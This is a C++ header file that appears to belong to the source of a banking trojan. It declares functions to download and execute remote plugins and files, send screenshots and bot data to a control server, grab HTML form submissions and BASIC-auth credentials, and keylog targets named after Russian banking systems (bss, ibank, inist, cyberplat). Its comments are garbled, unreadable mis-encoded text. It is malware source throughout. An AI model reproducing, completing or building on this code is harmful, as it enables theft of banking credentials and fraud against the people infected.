#ifndef LoaderH
#define LoaderH
//----------------------------------------------------------------------------

#include <WinSock.h>
#include "BotHTTP.h"
#include "BotClasses.h"

typedef struct TSendHTMLData
{
	PCHAR URL;         // �����, �������� ������
	DWORD BrowserType; // ��� ��������
	PCHAR UserAgent;   // ��� ������
	DWORD DataType;    // ��� ������������ ������
	PCHAR Data;        // ������������ ������
	PCHAR BotID;       // ������������� ����

} *PSendHTMLData;


//bool GrabberReports( char *Url, char *Buffer, DWORD dwBufSize );

//****************************************************************************
//  DownloadPlugin - ������� ��������� � ������� ������ (DLL)
//****************************************************************************
//LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize);


//****************************************************************************
//  DownloadPluginEx - ����������� �������� �������
//
//  ���������:
//
//  PluginPath - ������������� ���� � �������. (������ ���������� � ���������
//			     ����� "/". ���� �� ������� ����, �� ������� ������� �����
//				 ������� �� ��� �������������� ������
//  ScriptID -   ������������� ����� �������. ������������ ��� �������
//               GetBotScriptURL
//  MaxTime  -   ������������ ����� �������� �������.
//				 0 - ��� ����� �������.
//               INFINITE - ������ ����� ����������� �� ��� ��� ���� ��
//				 ����������
//  ModuleSize - ��������� �� ���������� ��� ������ ������� �������
//
//  ���������:
//
//	������� ������ �� ������� �������� � ������ �������� ��������
//
//****************************************************************************
//LPVOID DownloadPluginEx(PCHAR PluginPath, DWORD ScriptID, DWORD MaxTime, DWORD *ModuleSize);;


//****************************************************************************
//  DownloadPluginFromPath - ������� ��������� � ������� ������ (DLL)
//
//	Path - ������������� ���� � �������. ������ ���������� �
//        ��������� ����� /
//****************************************************************************
//LPVOID DownloadPluginFromPath(PCHAR Path, DWORD *ModuleSize);



bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  );

bool DownloadInFile( char *Url, WCHAR *FileName );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );


bool MySend( SOCKET Socket, const char *Data, int DataLen );
char **GetRealAddress( char *Host );

//bool WINAPI SendFormGrabberLogs(char *URL, char *Logs, char *UserAgent, DWORD dwBrowser, DWORD dwType );
bool SendFirstInfo();
bool SendTradeInfo( char *Buffer );

char *GetInfoFromBcServer( char *Url );
bool SendScreen( LPVOID lpFile, DWORD dwFileSize );

bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize );

void SetSBStarted(bool bStartHideJava_SB);
bool GetSBStarted();

bool ExecuteFile( char *Url, WCHAR *FileName );

#define HTONS(x) (((x) << 8) | ((x) >> 8))


//****************************************************************************
//  SendGrabberReport - ������� ���������� ����� � ����������� �������
//****************************************************************************
bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize);

// ������� ���������� ������ �� ������
//bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

//------------------------ ����������� �������� ������ ---------------------//

// ������� �������� ������
typedef void (*PSendDataEvent)(PSendHTMLData, // ������ �� ������������ ������
							   bool&,	      // �������� �������� ������� ���������
							   bool&);        // �������� �������� �������� ������

// ����� ���������
enum THandleDataMode  {hdmUnknown,   // ����� �� ����������
					   hdmDuplicate, // ����������� �� ��������� �����
					   hdmRedirect   // �������������� �� ��������� �����
					   };

// ���������������� ���������� ��������
DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL);

//----------------------------------------------------------------------------
/// ������� ����������� ��� ���������� RuBnk
typedef struct
{
	char *FilePath;
	DWORD dwType;
} BSSINIST, *PBSSINIST;

//#ifdef RuBnkH
DWORD WINAPI SendBSSInist( LPVOID lpData);
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved );


//---------------------------------------------------------------------------
//  CheckValidPostResult - ������� ��������� ����� ������� �� ������
//                         ����������� �������� ���� ������
//---------------------------------------------------------------------------
bool CheckValidPostResult(PHTTPResponse Response, PCHAR HTMLDocument);



//****************************************************************************
//  DataGrabber - ������� ��� ������ � ������������� �������
//****************************************************************************


#define DATA_BLOCK_URL       1
#define DATA_BLOCK_USERAGENT 2
#define DATA_BLOCK_DATA      3
#define DATA_BLOCK_APPNAME   4
#define DATA_BLOCK_CAB       5


// ���� ������������ �� ������ ������
#define DATA_TYPE_FORM   1  /* ������ HTML ���� */
#define DATA_TYPE_INJECT 2  /* ������ ���������� �� ����������� HTML ���������� */
#define DATA_TYPE_KEYLOG 3  /* ������ ��������� */
#define DATA_TYPE_CAB    4  /* CAB ����� */


// ��� ������������� ������ ����� ��������� ������ �� ������� ����� ��������
// ��������

const static PCHAR KEYLOGSYSTEM_BSS       = "bss";
const static PCHAR KEYLOGSYSTEM_IBANK     = "ibank";
const static PCHAR KEYLOGSYSTEM_INIST     = "inist";
const static PCHAR KEYLOGSYSTEM_CYBERPLAT = "cyberplat";
const static PCHAR KEYLOGSYSTEM_KP        = "kp";
const static PCHAR KEYLOGSYSTEM_PSV       = "psb";



namespace DataGrabber
{
	// ������� ���������� ���� � ����� ��������� ������
	PCHAR GetRepositoryPath();

	// ������� ���������� ���������� ��� ����� ��� �������� ������
	// ���� ������� ��� FileName �� ����� ������� ��� ����� �� ���
	// ������, � ��������� ������ ����� ��������� ���
	PCHAR GetDataFileName(PCHAR FileName = NULL);

	// ������� ���������� ��� ����� ��� �������� ������ ���������
	PCHAR GetKeyLoggerFileName();

	// ������� ���������� ������, ������� ����� ����������� �����
	PCHAR GetRepositoryPassword();

	// ��������� ���� ������ �� ������
    bool SendDataFile(PCHAR FileName);

	// ��������� ����� ���������� �������� ������
	void StartDataSender();


	//---------------------------------------------------------------
	// ������ ���������� ������ � ���������, ��� ���������� ��������
	//---------------------------------------------------------------

	// ������� ���� ������
	PDataFile CreateDataFile(DWORD DataType);

	// ������� ���� ������
    void CloseDataFile(PDataFile File);

	// ������� ���������� ������ � ��������� ��� ����������� ��������
	bool AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);

	// �������� ������ HTML �����
    bool AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);


	// ������� ��������� ������ BASIC ����������� ��� �������� �� ������
	void AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);


	//---------------------------------------------------------------
	// ������ �������� ������
	//---------------------------------------------------------------

	// ��������� ������ HTML ����
	bool SendFormGrabberData(PDataFile File);

	// �������������� ������ ��������
	bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

	//--------------------------------------------------------------
	//  ������ �������� CAB �������
	//--------------------------------------------------------------
	// ����������� �������� ������
	bool SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName);

	bool SendCab(PCHAR CabFileName, PCHAR AppName);


	// ���������� ���������� ��������
	bool Send�abFromDataFile(PDataFile File);

	// ���������� �������� ������
	// ������� ��������� ���� � ������� �������� � ���������� ����������
	// ���� ������ �����������. �� ����� ��� ����� ������� ����� �����
	// ������ �������
	bool SendCabDelayed(PCHAR URL, PCHAR CabFileName, PCHAR AppName);


}


//----------------------------------------------------------------------------
#endif



